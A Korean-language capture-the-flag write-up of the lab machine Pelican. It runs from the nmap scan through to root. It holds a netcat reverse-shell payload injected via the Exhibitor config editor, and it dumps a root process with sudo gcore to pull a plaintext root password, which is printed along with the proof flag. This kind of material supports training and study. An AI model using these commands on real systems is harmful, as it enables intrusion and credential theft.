```bash
┌──(kali㉿kali)-[~/PG/Pelican]
└─$ nnmap 192.168.115.98
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-15 10:30 +0900
Nmap scan report for 192.168.115.98
Host is up (0.067s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
| http-methods:
|_  Potentially risky methods: PUT
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Did not follow redirect to http://192.168.115.98:8080/exhibitor/v1/ui/index.html
39605/tcp open  java-rmi    Java RMI
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2026-06-14T21:31:07-04:00
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2026-06-15T01:31:07
|_  start_date: N/A

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   66.84 ms 192.168.45.1
2   66.79 ms 192.168.45.254
3   66.94 ms 192.168.251.1
4   67.10 ms 192.168.115.98

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.40 seconds
```


생소한 포트 및 제품 확인
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)

192.168.1158081 접근 후 Editing 가능 확인
![[Pasted image 20260615104052.png]]

exploit 검색
![[Pasted image 20260615104131.png]]

exploit 획득
`$(/bin/nc -e /bin/sh 192.168.45.179 4444 &)`
![[Pasted image 20260615104646.png]]

exploit 실행

![[Pasted image 20260615104628.png]]

RCE 성공
![[Pasted image 20260615104804.png]]

flag 획득
![[Pasted image 20260615104827.png]]

권한 상승 시도
`sudo -l`

```bash
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

ps -ef 로 실행중인 프로세스 확인
```bash
ps -ef | grep -i 'root'
root         1     0  0 21:27 ?        00:00:00 /sbin/init
root         2     0  0 21:27 ?        00:00:00 [kthreadd]
root         3     2  0 21:27 ?        00:00:00 [rcu_gp]
root         4     2  0 21:27 ?        00:00:00 [rcu_par_gp]
root         6     2  0 21:27 ?        00:00:00 [kworker/0:0H-kblockd]
root         7     2  0 21:27 ?        00:00:00 [kworker/u2:0-events_unbound]
root         8     2  0 21:27 ?        00:00:00 [mm_percpu_wq]
root         9     2  0 21:27 ?        00:00:00 [ksoftirqd/0]
root        10     2  0 21:27 ?        00:00:00 [rcu_sched]
root        11     2  0 21:27 ?        00:00:00 [rcu_bh]
root        12     2  0 21:27 ?        00:00:00 [migration/0]
root        14     2  0 21:27 ?        00:00:00 [cpuhp/0]
root        15     2  0 21:27 ?        00:00:00 [kdevtmpfs]
root        16     2  0 21:27 ?        00:00:00 [netns]
root        17     2  0 21:27 ?        00:00:00 [kauditd]
root        18     2  0 21:27 ?        00:00:00 [khungtaskd]
root        19     2  0 21:27 ?        00:00:00 [oom_reaper]
root        20     2  0 21:27 ?        00:00:00 [writeback]
root        21     2  0 21:27 ?        00:00:00 [kcompactd0]
root        22     2  0 21:27 ?        00:00:00 [ksmd]
root        23     2  0 21:27 ?        00:00:00 [khugepaged]
root        24     2  0 21:27 ?        00:00:00 [crypto]
root        25     2  0 21:27 ?        00:00:00 [kintegrityd]
root        26     2  0 21:27 ?        00:00:00 [kblockd]
root        27     2  0 21:27 ?        00:00:00 [edac-poller]
root        28     2  0 21:27 ?        00:00:00 [devfreq_wq]
root        29     2  0 21:27 ?        00:00:00 [watchdogd]
root        30     2  0 21:27 ?        00:00:00 [kswapd0]
root        48     2  0 21:27 ?        00:00:00 [kthrotld]
root        49     2  0 21:27 ?        00:00:00 [irq/24-pciehp]
root        50     2  0 21:27 ?        00:00:00 [irq/25-pciehp]
root        51     2  0 21:27 ?        00:00:00 [irq/26-pciehp]
root        52     2  0 21:27 ?        00:00:00 [irq/27-pciehp]
root        53     2  0 21:27 ?        00:00:00 [irq/28-pciehp]
root        54     2  0 21:27 ?        00:00:00 [irq/29-pciehp]
root        55     2  0 21:27 ?        00:00:00 [irq/30-pciehp]
root        56     2  0 21:27 ?        00:00:00 [irq/31-pciehp]
root        57     2  0 21:27 ?        00:00:00 [irq/32-pciehp]
root        58     2  0 21:27 ?        00:00:00 [irq/33-pciehp]
root        59     2  0 21:27 ?        00:00:00 [irq/34-pciehp]
root        60     2  0 21:27 ?        00:00:00 [irq/35-pciehp]
root        61     2  0 21:27 ?        00:00:00 [irq/36-pciehp]
root        62     2  0 21:27 ?        00:00:00 [irq/37-pciehp]
root        63     2  0 21:27 ?        00:00:00 [irq/38-pciehp]
root        64     2  0 21:27 ?        00:00:00 [irq/39-pciehp]
root        65     2  0 21:27 ?        00:00:00 [irq/40-pciehp]
root        66     2  0 21:27 ?        00:00:00 [irq/41-pciehp]
root        67     2  0 21:27 ?        00:00:00 [irq/42-pciehp]
root        68     2  0 21:27 ?        00:00:00 [irq/43-pciehp]
root        69     2  0 21:27 ?        00:00:00 [irq/44-pciehp]
root        70     2  0 21:27 ?        00:00:00 [irq/45-pciehp]
root        71     2  0 21:27 ?        00:00:00 [irq/46-pciehp]
root        72     2  0 21:27 ?        00:00:00 [irq/47-pciehp]
root        73     2  0 21:27 ?        00:00:00 [irq/48-pciehp]
root        74     2  0 21:27 ?        00:00:00 [irq/49-pciehp]
root        75     2  0 21:27 ?        00:00:00 [irq/50-pciehp]
root        76     2  0 21:27 ?        00:00:00 [irq/51-pciehp]
root        77     2  0 21:27 ?        00:00:00 [irq/52-pciehp]
root        78     2  0 21:27 ?        00:00:00 [irq/53-pciehp]
root        79     2  0 21:27 ?        00:00:00 [irq/54-pciehp]
root        80     2  0 21:27 ?        00:00:00 [irq/55-pciehp]
root        81     2  0 21:27 ?        00:00:00 [kstrp]
root       124     2  0 21:27 ?        00:00:00 [scsi_eh_0]
root       126     2  0 21:27 ?        00:00:00 [scsi_tmf_0]
root       128     2  0 21:27 ?        00:00:00 [vmw_pvscsi_wq_0]
root       132     2  0 21:27 ?        00:00:00 [ata_sff]
root       134     2  0 21:27 ?        00:00:00 [scsi_eh_1]
root       135     2  0 21:27 ?        00:00:00 [kworker/u2:2-flush-8:0]
root       136     2  0 21:27 ?        00:00:00 [kworker/0:1H-kblockd]
root       138     2  0 21:27 ?        00:00:00 [scsi_tmf_1]
root       140     2  0 21:27 ?        00:00:00 [scsi_eh_2]
root       141     2  0 21:27 ?        00:00:00 [scsi_tmf_2]
root       147     2  0 21:27 ?        00:00:00 [ttm_swap]
root       149     2  0 21:27 ?        00:00:00 [irq/16-vmwgfx]
root       185     2  0 21:27 ?        00:00:00 [kworker/0:2-events_freezable_power_]
root       220     2  0 21:27 ?        00:00:00 [kworker/u3:0]
root       222     2  0 21:27 ?        00:00:00 [jbd2/sda1-8]
root       223     2  0 21:27 ?        00:00:00 [ext4-rsv-conver]
root       257     1  0 21:27 ?        00:00:00 /lib/systemd/systemd-journald
root       280     1  0 21:27 ?        00:00:00 /lib/systemd/systemd-udevd
root       314     1  0 21:27 ?        00:00:00 /usr/bin/VGAuthService
root       323     1  0 21:27 ?        00:00:00 /usr/bin/vmtoolsd
root       443     1  0 21:27 ?        00:00:00 /usr/sbin/cron -f
root       444     1  0 21:27 ?        00:00:00 /usr/sbin/rsyslogd -n -iNONE
root       455     1  0 21:27 ?        00:00:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root       457     1  0 21:27 ?        00:00:00 /usr/sbin/ModemManager --filter-policy=strict
root       465     1  0 21:27 ?        00:00:00 /usr/lib/udisks2/udisksd
root       466     1  0 21:27 ?        00:00:00 /lib/systemd/systemd-logind
root       469   443  0 21:27 ?        00:00:00 /usr/sbin/CRON -f
root       487   469  0 21:27 ?        00:00:00 /bin/sh -c while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
avahi      504   464  0 21:27 ?        00:00:00 avahi-daemon: chroot helper
root       512     1  0 21:27 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
root       513     1  0 21:27 ?        00:00:00 /usr/bin/password-store
root       514     1  0 21:27 ?        00:00:00 /usr/sbin/cups-browsed
root       554     1  0 21:27 ?        00:00:00 /usr/sbin/lightdm
root       557     1  0 21:27 ?        00:00:00 /usr/sbin/sshd -D
root       581     1  0 21:27 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       582   554  0 21:27 tty7     00:00:00 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
root       584     1  0 21:27 ?        00:00:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
root       636     1  0 21:27 ?        00:00:00 /usr/sbin/cupsd -l
root       657   554  0 21:27 ?        00:00:00 lightdm --session-child 18 21
root       720   554  0 21:27 ?        00:00:00 lightdm --session-child 14 21
root      1322     1  0 21:29 ?        00:00:00 /usr/sbin/smbd --foreground --no-process-group
root      1324  1322  0 21:29 ?        00:00:00 /usr/sbin/smbd --foreground --no-process-group
root      1325  1322  0 21:29 ?        00:00:00 /usr/sbin/smbd --foreground --no-process-group
root      1327  1322  0 21:29 ?        00:00:00 /usr/sbin/smbd --foreground --no-process-group
root      1618     1  0 21:29 ?        00:00:00 /usr/sbin/NetworkManager --no-daemon
root      8310     2  0 21:53 ?        00:00:00 [kworker/0:0-ata_sff]
root      9706     2  0 21:58 ?        00:00:00 [kworker/0:1-ata_sff]
charles  10397     1  4 22:00 ?        00:00:00 java -Dzookeeper.log.dir=. -Dzookeeper.root.logger=INFO,CONSOLE -cp /opt/zookeeper/bin/../build/classes:/opt/zookeeper/bin/../build/lib/*.jar:/opt/zookeeper/bin/../lib/slf4j-log4j12-1.6.1.jar:/opt/zookeeper/bin/../lib/slf4j-api-1.6.1.jar:/opt/zookeeper/bin/../lib/netty-3.7.0.Final.jar:/opt/zookeeper/bin/../lib/log4j-1.2.16.jar:/opt/zookeeper/bin/../lib/jline-0.9.94.jar:/opt/zookeeper/bin/../zookeeper-3.4.6.jar:/opt/zookeeper/bin/../src/java/lib/*.jar:/opt/zookeeper/bin/../conf: -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=false org.apache.zookeeper.server.quorum.QuorumPeerMain /opt/zookeeper/bin/../conf/zoo.cfg
root     10470   487  0 22:00 ?        00:00:00 sleep 1
charles  10472 10363  0 22:00 ?        00:00:00 grep -i root

```

gcore 확인
https://gtfobins.org/gtfobins/gcore/?source=post_page-----9d59ebe6c6fb---------------------------------------https://gtfobins.org/gtfobins/gcore/?source=post_page-----9d59ebe6c6fb---------------------------------------

`root       513     1  0 21:27 ?        00:00:00 /usr/bin/password-store` 을 타깃으로 gcore 실행

strings 로 root 패스워드 획득
```bash
sudo gcore 513
0x00007f971bd1c6f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffc3d7a2c80, remaining=remaining@entry=0x7ffc3d7a2c80) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
Saved corefile core.513
[Inferior 1 (process 513) detached]
```
```bash
strings core.513
CORE
password-store
/usr/bin/password-store
CORE
x,z=
CORE
/usr/bin/passwor
////////////////
LINUX
/usr/bin/passwor
////////////////
IGISCORE
CORE
ELIFCORE
/usr/bin/password-store
/usr/bin/password-store
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
fork failed!
/tmp
;*3$"
aliases
ethers
group
gshadow
hosts
initgroups
netgroup
networks
passwd
protocols
publickey
services
shadow
CAk[S
N?z=
E?z=
libc.so.6
/lib/x86_64-linux-gnu
libc.so.6
P-z=
;*3$"
P.z=
sse2
x86_64
avx512_1
i586
i686
haswell
xeon_phi
linux-vdso.so.1
tls/x86_64/x86_64/tls/x86_64/
/lib/x86_64-linux-gnu/libc.so.6
P z=
8!z=
P z=
P z=
p&z=
p&z=
p&z=
@&z=
h''z=
0+z=
 +z=
 +z=
@(z=
(+z=
/usr/bin/passwor
////////////////
/usr/bin/passwor
////////////////
////////////////
`,z=
@-z=
@-z=
u##;
 -z=
001 Password: root:
ClogKingpinInning731
E?z=
]?z=
h?z=
u?z=
x86_64
/usr/bin/password-store
HOME=/root
LOGNAME=root
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/root
/usr/bin/password-store
bemX
__vdso_clock_gettime
__vdso_gettimeofday
__vdso_time
__vdso_getcpu
linux-vdso.so.1
LINUX_2.6
Linux
Linux
4.19.0-10-amd64
AVAUATSH
[A\A]A^]
D9+u
[A\A]A^]
D9#u
H+=x
H#=y
H+=K
H#=L
AVAUATI
[A\A]A^]
GCC: (Debian 8.3.0-6) 8.3.0
.shstrtab
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_d
.dynamic
.rodata
.note
.eh_frame_hdr
.eh_frame
.text
.altinstructions
.altinstr_replacement
.comment
.shstrtab
note0
load
```
![[Pasted image 20260615110647.png]]

자격증명 획득 후 flag 확인
```bash
su
ClogKingpinInning731
whoami
root
cd /root
cat proof.txt
3da5b5076fd3f0523b94859c757d46f0
```

![[Pasted image 20260615110738.png]]